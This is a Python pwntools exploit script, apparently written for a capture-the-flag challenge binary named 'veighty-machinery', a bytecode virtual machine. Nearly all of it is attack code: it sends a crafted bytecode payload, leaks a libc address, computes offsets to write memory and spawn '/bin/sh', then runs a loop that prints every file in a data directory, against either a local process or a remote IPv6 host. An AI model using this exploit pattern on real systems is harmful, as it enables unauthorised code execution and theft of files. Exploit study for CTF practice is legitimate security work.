#!/usr/bin/python

from pwn import *
import sys

#emote_ip, port = '', 
binary = './veighty-machinery'
brkpts = '''
'''

elf = ELF("veighty-machinery")
libc = ELF("./libc.so.6")

context.terminal = ['tmux', 'splitw', '-h']
context.arch = "amd64"
context.log_level = "debug"
context.aslr = False

re = lambda a: io.recv(a)
reu = lambda a: io.recvuntil(a)
rl = lambda: io.recvline()
s = lambda a: io.send(a)
sl = lambda a: io.sendline(a)
sla = lambda a,b: io.sendlineafter(a,b)
sa = lambda a,b: io.sendafter(a,b)

uu64 = lambda a: u64(a.ljust(8,"\x00"))

if len(sys.argv) > 1:
    io = remote("fd66:666:695::2", 7777)
    context.noptrace = True

else:
    io = process(binary, env = {"LD_PRELOAD" : "./libc.so.6"})

if __name__ == "__main__":
    io.sendlineafter("Length:\n", "24")
    payload = "\x18\x18\x18\x17\x17\x17\x03\x15\x02\x02\x02\x02\x02\x02\x03\x02\x02\x02\x02\x02\x18\x18\x17!CCCCCCCCCCCCCCCC\nnBBBBBBBBBBBBBBBB\n\x08\x12\x00\x00\x00\x00\x00\x00"
    io.sendafter("Bytecode:\n", payload)
    io.recvuntil("0x")
    leak = int("0x"+re(12).decode(), 16)
    libc_base = leak - 0x1bebe0
    addr1 = leak + 0x3288
    addr2 = leak - 0x175d90
    io.send(p64(addr1))
    io.sendline("a"*0x10)
    io.sendline(b"/bin/sh;" + p64(addr2))
    io.sendline("cd data; for f in *; do (cat ${f}; echo); done")
    
    io.interactive()
